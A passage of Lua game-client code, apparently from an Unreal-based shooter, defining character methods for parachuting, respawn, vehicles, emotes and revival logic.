local UKismetSystemLibrary=import("KismetSystemLibrary")
if UKismetSystemLibrary.IsStandalone(slua.getGameInstance())then
else
local Tips="DevelopmentClientCheck: "
Tips=Tips..string.format("Character =  %s ",tostring(self.Object))
Tips=Tips..string.format("HitBox_Stand =  %s ",tostring(self.HitBox_Stand))
Tips=Tips..string.format("HitBox_Prone =  %s ",tostring(self.HitBox_Prone))
print(bWriteLog and"CharacterBase:DevelopmentClientCheck.."..tostring(Tips))
self:RPC_Server_ShootVertifyFailAlarm(4,Tips)
end
end
end
function CharacterBase:IsAutonomousProxy()
if CharacterBase.__super.IsAutonomousProxy(self)then
return true
end
if Client and self.IsLocallyControlled and type(self.IsLocallyControlled)=="function"and self:IsLocallyControlled()then
return true
end
return CharacterBase.__super.IsAutonomousProxy(self)
end
function CharacterBase:SetLastAddBuffInst(nInstID,uPawn)
self.LastAddBuffInstID=nInstID
self.LastAddPawn=uPawn
end
function CharacterBase:GetLastAddBuffInst()
return self.LastAddBuffInstID,self.LastAddPawn
end
function CharacterBase:RegistAttrModifyRecordList()
end
function CharacterBase:ChangeCurrentVehicle(CurrentVehicle)
GameplayActorData.BindSelfActor("CurrentVehicle",CurrentVehicle)
end
function CharacterBase:ChangeCurrentWeapon()
if self.GetCurrentWeapon==nil then
return
end
local uWeapon=self:GetCurrentWeapon()
if slua.isValid(uWeapon)then
GameplayActorData.BindSelfActor("CurrentWeapon",uWeapon)
end
end
function CharacterBase:HandleOnClientAdjustPosition(NewLocation,Reason)
if CGameState==nil or not slua.isValid(CGameState)then
return
end
if CGameState.GetGameModeState==nil or CGameState:GetGameModeState()=="ReadyState"then
return
end
local EReason=import("ECharacterMoveDragReason")
if Reason==EReason.CMDR_ExceedsDistance and self.PlayerState and self.PlayerState.Ping then
local bWeakNet=self.PlayerState.Ping*4>250 or false
print(bWriteLog and"CharacterBase:HandleOnClientAdjustPosition "," Ping: ",self.PlayerState and self.PlayerState.Ping*4 or-1)
if bWeakNet then
NetUtil.ShowDSTimeOutTipsUI(true,NetUtil.DSTimeOutShort)
self:AddGameTimer(1,false,function()
NetUtil.ShowDSTimeOutTipsUI(false,NetUtil.DSTimeOutShort)
end)
end
end
end
function CharacterBase:CheckInitPlayerDSData()
if self:IsAutonomousProxy()then
if self.PlayerKey~=nil and self.PlayerKey>0 then
self:InitPlayerDsData(self.PlayerKey)
else
self:AddControlEvent(self,"OnReceivePlayerKey",self.InitPlayerDsData,self)
end
end
end
function CharacterBase:InitPlayerDsData(nPlayerKey)
if nPlayerKey==nil or nPlayerKey==0 then
print(bWriteLog and"CharacterBase InitPlayerDsData playerKey:",nPlayerKey)
return
end
local PlayerEventSubsystem=SubsystemMgr:Get("PlayerEventSystem")
if PlayerEventSubsystem then
PlayerEventSubsystem:CheckInitDSData(nPlayerKey)
end
end
function CharacterBase:ReceiveEndPlay(nDeltaSeconds)
printf("CharacterBase ReceiveEndPlay() PlayerKey:%s",tostring(self.PlayerKey))
BudgetScheduler.EvictOwner(BudgetScheduler.Channel.Init,self.Object)
if Client then
local SKillManager=self:GetSkillManager()
local CheckWeaponSkillID=1014405
if slua.isValid(SKillManager)and SKillManager:GetCurSkillID()==CheckWeaponSkillID then
self:StopCurrentLevelSequence()
end
if self.ReportCharacterStateTimer then
self:RemoveGameTimer(self.ReportCharacterStateTimer)
self.ReportCharacterStateTimer=nil
end
end
GameplayData.UnbindPlayerCharacter(self.Object)
if Client then
local AvatarExceptionSubsystem=SubsystemMgr:Get("AvatarExceptionSubsystem")
if AvatarExceptionSubsystem then
AvatarExceptionSubsystem:UnbindPlayerCharacter(self.Object)
end
end
if self.PlayerKey~=nil and self.PlayerKey>0 then
EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_WEAPON,EVENTID_PLAYEREVENT_WEAPON_CLEAR,self.PlayerKey)
local PlayerEventSubsystem=SubsystemMgr:Get("PlayerEventSystem")
if PlayerEventSubsystem then
PlayerEventSubsystem:ClearPlayer(self.PlayerKey)
end
end
self:ClearFollowEmote()
if not self:HasAuthority()then
self:ClearAkEventSound()
end
self._SuperData=nil
CharacterBase.__super.ReceiveEndPlay(self,nDeltaSeconds)
end
function CharacterBase:GetVehicleParachuteComponent()
if self.VehicleParachuteComponent==nil then
local ComponentClass=import("VehicleParachuteComponent")
self.VehicleParachuteComponent=self:GetComponentByClass(ComponentClass)
end
return self.VehicleParachuteComponent
end
function CharacterBase:ReceivePossessed(InController)
if not slua.isValid(InController)then
return
end
print(bWriteLog and"CharacterBase:ReceivePossessed")
self.Super:ReceivePossessed(InController)
local FeatureUtil=require("GameLua.Mod.BaseMod.GamePlay.Feature.Common.FeatureUtil")
FeatureUtil.ForEachFeatureCall(self,"ReceivePossessed",InController)
self:HandleUseGlide(InController)
self:HandleParachuteComponent(InController)
self:InitRevivalCount(InController)
if not Client and not Game:IsAIController(InController)then
self:RegistAttrModifyRecordList()
elseif not Client and Game:IsAIController(InController)then
self.IndoorCheckTime=2
end
printf(bWriteLog and"CharacterBase:ReceivePossessed Before PlayerKey:%d NetConsiderFrequency:%f NetUpdateFrequency:%f MinNetUpdateFrequency:%f",self.PlayerKey,self.NetConsiderFrequency,self.NetUpdateFrequency,self.MinNetUpdateFrequency)
local bBatchMove=USTExtraBlueprintFunctionLibrary.IsActorRepMovementWithBatch(self.Object)
self:RefreshNetUpdateFrequency(bBatchMove)
if InController and slua.isValid(InController)and InController.RefreshNetUpdateFrequency then
InController:RefreshNetUpdateFrequency(bBatchMove)
end
if bBatchMove then
self.bHighUpdateRateForReplay=true
end
if not Client then
if Game:IsAIController(InController)then
self.bReplayLowRateByAIPossess=true
elseif self.bReplayLowRateByAIPossess then
self.bReplayLowRateByAIPossess=nil
self.bLowUpdateRateForReplay=false
end
end
self:AddGameTimer(5,false,function()
if self.PlayerKey~=nil then
printf(bWriteLog and"CharacterBase:ReceivePossessed After PlayerKey:%d NetConsiderFrequency:%f NetUpdateFrequency:%f MinNetUpdateFrequency:%f",self.PlayerKey,self.NetConsiderFrequency,self.NetUpdateFrequency,self.MinNetUpdateFrequency)
end
end)
end
function CharacterBase:HandleParachuteComponent(InController)
if slua.isValid(InController)and slua.isValid(self.ParachuteComponent)then
if Game:IsClassOf(InController,ASTExtraPlayerController)then
self.ParachuteComponent:InitParachuteData(InController)
elseif Game:IsClassOf(InController,ANewFakePlayerAIController)and self.ParachuteComponent.InitAIParachuteData then
self.ParachuteComponent:InitAIParachuteData(InController)
end
end
end
function CharacterBase:InitRevivalCount(InController)
if not self:HasAuthority()then
return
end
local uPlayerState=self:GetPlayerStateSafety()
if uPlayerState and slua.isValid(uPlayerState)then
if uPlayerState.InitRevivalCountImpl then
uPlayerState:InitRevivalCountImpl(InController,self.Object)
else
print(bWriteLog and"CharacterBase:InitRevivalCount, have no function InitRevivalCountImpl")
end
else
print(bWriteLog and"CharacterBase:InitRevivalCount, uPlayerState = "..tostring(uPlayerState))
end
end
function CharacterBase:HandleUseGlide(InController)
if self:HasAuthority()then
self:InitParachutingVehicle()
end
end
function CharacterBase:HandleEnterGameModeFightingState()
print(bWriteLog and"CharacterBase:HandleEnterGameModeFightingState")
if slua.isValid(CGameState)and CGameState:IsCreativeMode()then
return
end
if self:CharacterIsRecycled()then
print(bWriteLog and"CharacterBase:HandleEnterGameModeFightingState, CharacterIsRecycled = true")
return
end
if slua.isValid(self.Object)and not self:HasAuthority()and self.EmoteBPIDToAnimHandleMap then
local CheckTable={
2206015,
2206016,
2206017,
2206018
}
for _,ID in pairs(CheckTable)do
local EmoteHandle=self.EmoteBPIDToAnimHandleMap:Get(ID)
if slua.isValid(EmoteHandle)and EmoteHandle.EmoteActionList then
local NeedStop=false
for _,Action in pairs(EmoteHandle.EmoteActionList)do
if Action:GetIsExecuting()then
NeedStop=true
break
end
end
if NeedStop then
self:OnPlayEmoteStop(ID)
end
end
end
end
end
function CharacterBase:InitParachutingVehicle()
if self:HasAuthority()then
if self.bEnsure then
print(bWriteLog and"CharacterBase:InitParachutingVehicle self.bEnsure")
return
end
local ComponentClass=self.DynamicComponentMap:Get("ParachutingVehicle")
if ComponentClass then
local UScriptGameplayStatics=import("ScriptGameplayStatics")
UScriptGameplayStatics.CreateComponent(self,ComponentClass,"ParachutingVehicle",false)
else
print(bWriteLog and"CharacterBase:InitParachutingVehicle not ComponentClass")
end
end
end
function CharacterBase:PlayerPoseChange(stLastPoseState,stNewPoseState)
local ESTEPoseState=import("ESTEPoseState")
if Client and(self.IsClientPeeking and stNewPoseState==ESTEPoseState.Sprint or stNewPoseState==ESTEPoseState.CrouchSprint)then
self:NM_ForceSetPeekState(false,false)
end
end
function CharacterBase:HandleAttachedToVehicle(uVehicle)
if not slua.isValid(uVehicle)then
return
end
if slua.isValid(self.CharacterMovement)then
self.CharacterMovement:SetBase(nil,"",true)
end
if uVehicle.ForceUseTPP then
print(bWriteLog and"CharacterBase:HandleAttachedToVehicle, bIsFPPOnVehicle: false",self.Object,uVehicle)
self.bIsFPPOnVehicle=false
end
end
function CharacterBase:HandleDetachedFromVehicle(uLastVehicle)
if not slua.isValid(self.Object)or not slua.isValid(uLastVehicle)then
return
end
if uLastVehicle.ForceUseTPP then
print(bWriteLog and"CharacterBase:HandleAttachedToVehicle, bIsFPPOnVehicle: true",self.Object,uLastVehicle)
self.bIsFPPOnVehicle=true
end
if Client then
local Location=self:K2_GetActorLocation()
if Location.X>-1.0E-5 and Location.X<1.0E-5 and-1.0E-5<Location.Y and 1.0E-5>Location.Y and-1.0E-5<Location.Z and 1.0E-5>Location.Z then
Location=uLastVehicle:K2_GetActorLocation()+FVector(0,0,200)
print(bWriteLog and string.format("CharacterBase:HandleAttachedToVehicle, Vehicle: %s, character location: %s",uLastVehicle,Location))
self:K2_SetActorLocation(Location,false,nil,true)
end
end
end
function CharacterBase:SwitchWeaponBySlotAfterConsume(OldWeaponSlotBeforeSkill)
print(bWriteLog and"SwitchWeaponBySlotAfterConsume",OldWeaponSlotBeforeSkill)
local ESurviveWeaponPropSlot=import("ESurviveWeaponPropSlot")
if OldWeaponSlotBeforeSkill==ESurviveWeaponPropSlot.SWPS_HandProp and self.GetPlayerControllerSafety then
local Controller=self:GetPlayerControllerSafety()
if not(slua.isValid(Controller)and GameLuaAPI.IsClassOf(Controller,ASTExtraPlayerController))or not self:AllowState(EPawnState.SwitchWeapon,false)then
return
end
if self:HasState(EPawnState.WebSwing)and slua.isValid(self.STCharacterMovement)then
local ESpecialMovementType=import("ESpecialMovementType")
local ESpiderSwingMoveState=import("ESpiderSwingMoveState")
local SpiderSwingObj=self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(ESpecialMovementType.SPECIAL_MOVE_SpiderSwing)
if slua.isValid(SpiderSwingObj)then
local nCurState=SpiderSwingObj:GetCurMoveState()
if nCurState==ESpiderSwingMoveState.Launching or nCurState==ESpiderSwingMoveState.Swinging then
print(bWriteLog and"CharacterBase:SwitchWeaponBySlotAfterConsume blocked by SpiderSwing state: "..tostring(nCurState))
return
end
end
end
Controller:ServerAutoSwitchSameSlotWeapon(OldWeaponSlotBeforeSkill)
elseif self.SwitchWeaponBySlot then
self:SwitchWeaponBySlot(OldWeaponSlotBeforeSkill,true,false,false)
end
end
function CharacterBase:IsEnablePlayerShovleing()
local EPawnState=import("EPawnState")
return not self:HasState(EPawnState.Prone)and self:HasState(EPawnState.Sprint)
end
function CharacterBase:OnRep_CarryBackStateChanged()
local uCarryBackComp=self:GetCarryBackComp()
if slua.isValid(uCarryBackComp)then
uCarryBackComp:OnRep_CarryBackStateChanged()
end
end
function CharacterBase:ShowCharacter(bShow)
self:SetActorHiddenInGame(not bShow)
end
function CharacterBase:ShowMainWeaponOnBack(bShow)
local uWeaponMgrCom=self:GetWeaponManager()
if uWeaponMgrCom and slua.isValid(uWeaponMgrCom)then
uWeaponMgrCom.ShowMainWeaponModelOnBack=bShow
end
end
function CharacterBase:AddRevivalCount(nRevivalCount)
if type(nRevivalCount)=="number"then
local uPlayerState=self:GetPlayerStateSafety()
if uPlayerState and slua.isValid(uPlayerState)then
if uPlayerState.GetRevivalCount and uPlayerState.SetRevivalCount then
local GeneralRevivalCount=uPlayerState:GetRevivalCount()
GeneralRevivalCount=GeneralRevivalCount+nRevivalCount
if GeneralRevivalCount<0 then
GeneralRevivalCount=0
end
print(bWriteLog and"CharacterBase:AddRevivalCount, nRevivalCount = "..tostring(nRevivalCount))
uPlayerState:SetRevivalCount(GeneralRevivalCount)
else
print(bWriteLog and"CharacterBase:AddRevivalCount, Have no function")
end
end
else
print(bWriteLog and"CharacterBase:AddRevivalCount, type(nRevivalCount) = "..type(nRevivalCount))
end
end
function CharacterBase:SetUseDeadBox(bUseDeadBox)
local eUseDeadBox=1
if not bUseDeadBox then
eUseDeadBox=0
end
printf("revivaldebug CharacterBase SetUseDeadBox PlayerKey:%u, eUseDeadBox:%d ",self.PlayerKey,eUseDeadBox)
self:SetAttrValue("bUseDeadBox",eUseDeadBox,-1)
end
function CharacterBase:GetUseDeadBox()
local fUseDeadBox=self:GetAttrValue("bUseDeadBox")
local nUseDeadBox=math.floor(fUseDeadBox+0.1)
return 0<nUseDeadBox
end
function CharacterBase:CharacterAttrChangeEvent(uPawn,AttrName,AttrVal)
if self.Object==uPawn then
if AttrName=="bUseDeadBox"then
self.bIsUseDeadBox=self:GetUseDeadBox()
print(bWriteLog and"revivaldebug CharacterBase CharacterAttrChangeEvent PlayerKey:, self.bIsUseDeadBox:",self.PlayerKey,self.bIsUseDeadBox)
elseif AttrName=="IsInUnderGroundArea"then
self.bIsInUnderGroundArea=AttrVal==1
if not Client then
local ESightVisionCondition=import("ESightVisionCondition")
local USTExtraModLogicSwitchLibrary=import("STExtraModLogicSwitchLibrary")
if USTExtraModLogicSwitchLibrary.IsNightVisionUnderGroundOnly()then
self:SetSightCondition(self.bIsInUnderGroundArea,ESightVisionCondition.NightVisionUnderGround)
end
end
elseif AttrName=="IsAroundUndergroundEntry"then
self.bIsAroundUndergroundEntry=AttrVal==1
elseif AttrName=="EmotePlayRate"then
if Client then
local PhotoGrapherSubSystem=SubsystemMgr:Get("PhotoGrapherSubSystem")
if PhotoGrapherSubSystem then
PhotoGrapherSubSystem:EmotePlayRateChanged(self.Object,AttrVal)
end
end
elseif AttrName=="AreaID"then
self:ChangeFootStepValue(AttrVal)
self:HandleAreaIDChanged(AttrVal)
if self:IsLocalControlorView()or self:IsLocalViewed()then
print(bWriteLog and"revivaldebug CharacterBase CharacterAttrChangeEvent PlayerKey:, AreaID",self.PlayerKey,AttrVal)
EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER,EVENTID_PLAYEREVENT_LOCAL_CHAR_AREA_ID_CHANGED,AttrVal)
else
EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER,EVENTID_PLAYEREVENT_CHAR_AREA_ID_CHANGED,AttrVal)
end
elseif AttrName=="MapID"then
if not Client and self:IsAuthority()then
local uPlayerState=self:GetPlayerStateSafety()
if slua.isValid(uPlayerState)then
uPlayerState.MapID=AttrVal
end
end
elseif AttrName=="DanceStageAreaState"and Client then
EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_CHARACTER,EVENTID_PLAYEREVENT_DANCESTATE_CHANGED,AttrVal,self.Object)
end
end
end
function CharacterBase:ChangeFootStepValue(AttrVal)
if self.DefaultFootStep and AttrVal==0 then
return
end
local FootStepSoundConfig=GamePlayTools.GetCurrentConfig("FootStepSoundConfig")
if not FootStepSoundConfig or not FootStepSoundConfig.bOpenAreaFootStep then
return
end
local IntVal=math.tointeger(AttrVal)
local AreaPara=FootStepSoundConfig[IntVal]or FootStepSoundConfig.DefaultPara
local DefaultPara=FootStepSoundConfig.DefaultPara
self.DefaultFootStep=AreaPara==DefaultPara
self.FloorHeight=AreaPara.FloorHeight or DefaultPara.FloorHeight
self.GFloorValue=AreaPara.GFloorValue or DefaultPara.GFloorValue
self.DiffFloorValue=AreaPara.DiffFloorValue or DefaultPara.DiffFloorValue
print(bWriteLog and"CharacterBase:ChangeFootStepValue, FloorHeight = "..self.FloorHeight)
self.bInSoundDiffFloorArea=AreaPara.bInSoundDiffFloorArea or DefaultPara.bInSoundDiffFloorArea
end
function CharacterBase:HandleAreaIDChanged(AttrVal)
print(bWriteLog and"CharacterBase:HandleAreaIDChanged, AttrVal = "..tostring(AttrVal))
end
function CharacterBase:HandleOnRespawn()
printf("revivaldebug CharacterBase HandleOnRespawn")
if self:IsAuthority()then
printf(bWriteLog and"revivaldebug CharacterBase HandleOnRespawn self.PlayerKey:%u",self.PlayerKey)
local uPlayerState=self:GetPlayerStateSafety()
if slua.isValid(uPlayerState)and uPlayerState.SetCanSelfRevival then
uPlayerState:SetCanSelfRevival(false)
end
EventSystem:postEvent(EVENTTYPE_SECURITY,EVENTID_SECURITY_PLAYER_RESPAWN,self.Object)
else
local ENetRole=import("ENetRole")
local uPlayerController=self:GetPlayerControllerSafety()
if self:IsAutonomousProxy()then
local UGameplayStatics=import("GameplayStatics")
local uGameInstance=UGameplayStatics.GetGameInstance(self)
if slua.isValid(uGameInstance)then
local uReplay=uGameInstance:GetClientInGameReplay()
if slua.isValid(uReplay)and uReplay:IsInRecordState()then
printf("revivaldebug CharacterBase HandleOnRespawn clear deathplayback data")
uReplay:OnPlayerRespawnNotify()
end
end
local VibrateUtilitySubsystem=SubsystemMgr:Get("VibrateUtilitySubsystem")
if VibrateUtilitySubsystem and VibrateUtilitySubsystem.HandleCharacterRespawned then
print(bWriteLog and"CharacterBase.HandleOnRespawn VibrateUtilitySubsystem call HandleCharacterRespawned")
VibrateUtilitySubsystem:HandleCharacterRespawned()
end
if slua.isValid(uPlayerController)and not uPlayerController:IsPureSpectator()and not uPlayerController:IsDemoPlayGlobalObserver()and not uPlayerController:IsDemoPlaySpectator()then
print(bWriteLog and"CharacterBase.HandleOnRespawn QuitSpectating")
if uPlayerController.QuitSpectating then
uPlayerController:QuitSpectating()
end
local uViewTarget=uPlayerController:GetViewTarget()
if slua.isValid(uViewTarget)and slua.isValid(self.Object)then
if uViewTarget.Role==ENetRole.ROLE_SimulatedProxy then
print(bWriteLog and"CharacterBase.HandleOnRespawn, SetViewTarget to Owned Pawn 1")
uPlayerController:SetViewTargetTest(self.Object)
elseif Game:IsClassOf(uViewTarget,slua.loadClass("/Game/Mod/EvoBase/Arts_PlayerBluePrints/Skill/CarryDeadBox/DeadBoxViewTarget.DeadBoxViewTarget"))then
print(bWriteLog and"CharacterBase.HandleOnRespawn, SetViewTarget to Owned Pawn 2")
uPlayerController:SetViewTargetTest(self.Object)
end
end
if uPlayerController:ShouldForceFPPView(self)then
local EPlayerCameraMode=import("EPlayerCameraMode")
uPlayerController:SwitchCameraMode(EPlayerCameraMode.PCM_FPP,nil,false,true)
else
uPlayerController:SwitchCameraMode(uPlayerController.CurCameraMode,nil,false,true)
end
end
self:AddGameTimer(3,false,function()
local PlayerRespawnData=slua.IndexReference(self,"PlayerRespawnData")
if PlayerRespawnData and not PlayerRespawnData.bIsDead and self.CharacterHide and not self.CharacterHide.bCharacterHideIngame and self.bHidden==true and not self:HasState(EPawnState.InPlane)then
self:SetActorHiddenInGame(false)
end
end)
elseif slua.isValid(self.STCharacterMovement)then
self.STCharacterMovement.MaxWalkSpeed=600
end
if slua.isValid(uPlayerController)and uPlayerController:IsInSpectating()and uPlayerController:GetLastestViewPlayerKey()==self.PlayerKey then
printf("revivaldebug CharacterBase HandleOnRespawn ServerObserveCharacter  self.PlayerKey:%u",self.PlayerKey)
uPlayerController:ServerObserveCharacter(self.PlayerKey)
end
if slua.isValid(self.STCharacterMovement)then
self.STCharacterMovement.GravityScale=1.0
local uAttachParentActor=self:GetAttachParentActor()
if slua.isValid(uAttachParentActor)then
self:CheckAttachedOrDetachedVehicle(true)
self.STCharacterMovement:Deactivate()
end
end
if self.Role==ENetRole.ROLE_SimulatedProxy then
self:RefreshThermalImagingLocal()
end
local uCurrentVehicle=self:GetCurrentVehicle()
if slua.isValid(uCurrentVehicle)then
local ESTExtraVehicleType=import("ESTExtraVehicleType")
local bStayCharacterCollisionOnVehicle=uCurrentVehicle.VehicleType==ESTExtraVehicleType.VT_CatapultMachine
local uRootComp=self.CapsuleComponent
if slua.isValid(uRootComp)and not bStayCharacterCollisionOnVehicle then
local ECollisionChannel=import("ECollisionChannel")
local ECollisionResponse=import("ECollisionResponse")
uRootComp:SetCollisionResponseToChannel(ECollisionChannel.ECC_Vehicle,ECollisionResponse.ECR_Ignore)
uRootComp:SetCollisionResponseToChannel(ECollisionChannel.ECC_Pawn,ECollisionResponse.ECR_Ignore)
else
print(bWriteLog and"CharacterBase.HandleOnRespawn Ignore Vehicle vs Character collision failed, the root capsule is null or StayCharacterCollisionOnVehicle")
end
end
end
self:LuaBroadcastCommonEventCpp("EVENTTYPE_PLAYEREVENT_CHARACTER","EVENTID_PLAYEREVENT_REVIVAL",self.PlayerKey,self.Object,self.TeamID)
end
function CharacterBase:HandleOnPreEnterNearDeath(uKillPlayerController,DamageCauser)
EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL,EVENTID_ON_PRE_ENTER_NEAR_DEATH,self)
if CGameMode and CGameMode.CheckAllTeammatesKnockedDown then
CGameMode:CheckAllTeammatesKnockedDown(self.Object)
end
end
function CharacterBase:LuaHandleParachuteStateChanged(LastParachuteState,NewParachuteState)
print(bWriteLog and"CharacterBase:OnParachuteStateChanged",self.Role,LastParachuteState,NewParachuteState)
local EParachuteState=import("EParachuteState")
if not Client then
print(bWriteLog and"CharacterBase:OnParachuteStateChanged, SetNetCullDistanceSquared",NewParachuteState)
if NewParachuteState==EParachuteState.PS_FreeFall or NewParachuteState==EParachuteState.PS_Opening then
self:SetNetCullDistanceSquared(900000000)
else
self:SetNetCullDistanceSquared(self.DefaultNetCullDistanceSq)
end
else
local ENetRole=import("ENetRole")
if self.Role==ENetRole.ROLE_AutonomousProxy then
local EParachuteState=import("EParachuteState")
if(NewParachuteState==EParachuteState.PS_FreeFall or NewParachuteState==EParachuteState.PS_Opening)and self.SwimComponet and slua.isValid(self.SwimComponet)then
self.SwimComponet:LeaveWater()
end
if self.Role==ENetRole.ROLE_AutonomousProxy and self.HealthStatus==ECharacterHealthStatus.HasLastBreath and(self.ParachuteState==EParachuteState.PS_Opening or self.ParachuteState==EParachuteState.PS_FreeFall)then
self:SwitchCameraToParachuteOpening()
end
if self.HealthStatus==ECharacterHealthStatus.HasLastBreath and LastParachuteState==EParachuteState.PS_Opening and(NewParachuteState~=EParachuteState.PS_Opening or NewParachuteState~=EParachuteState.PS_Landing)then
local uSpringArmComp=self.SpringArmComp
if slua.isValid(uSpringArmComp)then
local CrouchHalfHeight=self:GetCrouchHalfHeight()
CrouchHalfHeight=CrouchHalfHeight or 60
uSpringArmComp:K2_SetRelativeLocation(FVector(0,0,-CrouchHalfHeight),false,nil,true)
local ECameraDataType=import("ECameraDataType")
uSpringArmComp:SetCameraDataEnable(ECameraDataType.ECameraDataType_NearDeath,true)
print(bWriteLog and"NearDeathParachute 落地回复弹簧臂位置")
end
end
EventSystem:postEvent(EVENTTYPE_INGAME_PARACHUTING,EVENTID_CLIENT_PARACHUTE_STATE_CHANGE,LastParachuteState,NewParachuteState)
end
end
if NewParachuteState==EParachuteState.PS_None then
EventSystem:postEvent(EVENTTYPE_INGAME_PARACHUTING,EVENTID_PARACHUTING_END,self.Object)
end
end
function CharacterBase:LuaHandleRepParachuteStateDelegate()
local ENetRole=import("ENetRole")
local EParachuteState=import("EParachuteState")
if not(self and self.Role)or not self.ParachuteState then
print(bWriteLog and"CharacterBase:LuaHandleRepParachuteStateDelegate Role or ParachuteState is nil")
return
end
print(bWriteLog and"CharacterBase:LuaHandleRepParachuteStateDelegate",self.Role,self.ParachuteState)
if self.Role==ENetRole.ROLE_SimulatedProxy and self.ParachuteState==EParachuteState.PS_FreeFall then
print(bWriteLog and"CharacterBase:LuaHandleRepParachuteStateDelegate RefreshParacthueAnimTimer")
if self.RefreshParacthueAnimTimer then
self:RemoveGameTimer(self.RefreshParacthueAnimTimer)
self.RefreshParacthueAnimTimer=nil
end
self.RefreshParacthueAnimTimer=self:AddGameTimer(0.5,false,function()
self:RemoveGameTimer(self.RefreshParacthueAnimTimer)
self.RefreshParacthueAnimTimer=nil
if self and slua.isValid(self.Object)then
print(bWriteLog and"CharacterBase:LuaHandleRepParachuteStateDelegate RefreshParachuteAnim")
self:TryCacheParachuteAnim()
end
end)
end
end
function CharacterBase:TryCacheParachuteAnim()
local uCharacter=self.Object
if not slua.isValid(uCharacter)or not slua.isValid(uCharacter.Mesh)then
print(bWriteLog and"CharacterBase:TryCacheParachuteAnim Character is nil")
return
end
local CH_ABP_Parachute_Class=slua.loadClass("/Game/Arts_Player/Characters/Animation/Base_AnimBP/Feature/CH_ABP_Parachute.CH_ABP_Parachute")
local uAnimInstances=uCharacter.Mesh:GetSubAnimInstances()
print(bWriteLog and"CharacterBase:TryCacheParachuteAnim. uAnimInstances = "..tostring(uAnimInstances))
if uAnimInstances and uAnimInstances.Num then
local num=uAnimInstances:Num()
print(bWriteLog and"CharacterBase:TryCacheParachuteAnim. num = "..tostring(num))
for i=1,num do
local uAnimInst=uAnimInstances:Get(i-1)
print(bWriteLog and"CharacterBase:TryCacheParachuteAnim. uAnimInst = "..tostring(uAnimInst))
if slua.isValid(uAnimInst)and Game:IsClassOf(uAnimInst,CH_ABP_Parachute_Class)and uAnimInst.CacheParachuteAnimVars~=nil then
print(bWriteLog and"CharacterBase:TryCacheParachuteAnim. CacheParachuteAnimVars")
uAnimInst:CacheParachuteAnimVars(true)
break
end
end
end
end
function CharacterBase:GetBroadcastFatalDamageExpandData(uCauserPawn,uVictimPawn,RealKiller,DamageType,CauserWeaponAvatarID)
local expandDataStr=""
local expandDataTable=self:GetBroadcastFatalDamageExpandDataForLua(uCauserPawn,uVictimPawn)
if SubsystemMgr then
local FatalDamageExpandDataSubsystem=SubsystemMgr:Get("FatalDamageExpandDataSubsystem")
if FatalDamageExpandDataSubsystem then
expandDataTable=FatalDamageExpandDataSubsystem:GetBroadcastFatalDamageExpandData(uCauserPawn,uVictimPawn,expandDataTable,RealKiller,DamageType)
end
end
expandDataTable=expandDataTable or{}
expandDataTable.CauserWeaponAvatarID=CauserWeaponAvatarID or 0
if expandDataTable~=nil then
expandDataStr=slua.LuaArchiverEncode(LuaStateWrapper,expandDataTable)
end
local ASTExtraBaseCharacter=import("/Script/ShadowTrackerExtra.STExtraBaseCharacter")
ASTExtraBaseCharacter.SetExpandDataContent(expandDataStr)
return expandDataStr
end
function CharacterBase:GetBroadcastFatalDamageExpandDataForLua(uCauserPawn,uVictimPawn)
local expandDataTable={}
if uVictimPawn and slua.isValid(uVictimPawn)then
expandDataTable.bHaveSelfRescueItem=false
local PlayerState=uVictimPawn:GetPlayerStateSafety()
if PlayerState and slua.isValid(PlayerState)then
if PlayerState.CheckCanSelfRescue then
PlayerState:CheckCanSelfRescue()
else
print(bWriteLog and"CharacterBase:GetBroadcastFatalDamageExpandDataForLua, have no function CheckCanSelfRescue, PlayerKey = "..tostring(uVictimPawn.PlayerKey))
end
else
print(bWriteLog and"CharacterBase:GetBroadcastFatalDamageExpandDataForLua, PlayerState = "..tostring(PlayerState)..", PlayerKey = "..tostring(uVictimPawn.PlayerKey))
end
local CurrentValue=uVictimPawn:GetAttrValue("bCanSelfRescue")
print(bWriteLog and"CharacterBase:GetBroadcastFatalDamageExpandDataForLua, CurrentValue = "..tostring(CurrentValue)..", PlayerKey = "..tostring(uVictimPawn.PlayerKey))
if 0<CurrentValue then
expandDataTable.bHaveSelfRescueItem=true
end
end
return expandDataTable
end
function CharacterBase:ServerCheckEmoteCanPlay(EmoteID)
if not self:CheckEmoteBanTable(EmoteID)then
print(bWriteLog and"CharacterBase ServerCheckEmoteCanPlay EmoteIsBan"..tostring(EmoteID))
return false
end
local logic_emote=require("GameLua.Mod.Library.GamePlay.Avatar.Emote.logic_emote")
if logic_emote.CheckIsDanceTogetherEmote(EmoteID)then
local EmoteSubSystem=SubsystemMgr:Get("EmoteSubSystem")
if not EmoteSubSystem:IsInPreListOrDanceList(self.Object)then
print(bWriteLog and"CharacterBase ServerCheckEmoteCanPlay not in DanceList")
return false
end
end
return true
end
function CharacterBase:UpdateEmoteExtraInfo(EmoteID,ExtraInfo)
if EmoteID==12220605 then
math.randomseed(os.time())
local randomNumber=math.random(0,99)
return tostring(randomNumber)
end
return ExtraInfo
end
function CharacterBase:CheckEmoteBanTable(EmoteID)
local EmoteData=CDataTable.GetTableData("BattleBanOnEmote",EmoteID)
if not EmoteData then
return true
end
local uGameState=GameplayData.GetGameState()
if not slua.isValid(uGameState)or not uGameState.GetGameModeState then
return true
end
if uGameState:GetGameModeState()~="ReadyState"then
return false
end
return true
end
function CharacterBase:ReportExceptionOnVehicle(Type,Msg)
local ErrorMsg=string.format("VehicleException Type:%s, Msg:%s\n",Type,Msg)
if Client then
local ClientToolsReport=require("client.slua.logic.report.ClientToolsReport")
ClientToolsReport:SendReport(ClientToolsReport.Enum_SvrReport_Type.Enum_Vehicle,ErrorMsg)
end
if LogExceptionAndReport~=nil then
LogExceptionAndReport(ErrorMsg)
LogExceptionAndReport(ErrorMsg)
end
end
function CharacterBase:PlayLevelSequenceByPath(SequenceActorPath,LevelSequencePath,TimeOffset)
print(bWriteLog and Game:GetPlainName(self),"CharacterBase:PlayLevelSequenceByPath",SequenceActorPath,LevelSequencePath,TimeOffset)
return self:PlayLevelSequenceInternal(SequenceActorPath,LevelSequencePath,nil,TimeOffset)
end
function CharacterBase:PlayLevelSequenceByPathAndBindingInfo(SequenceActorPath,LevelSequencePath,TrackBindingInfo,TimeOffset)
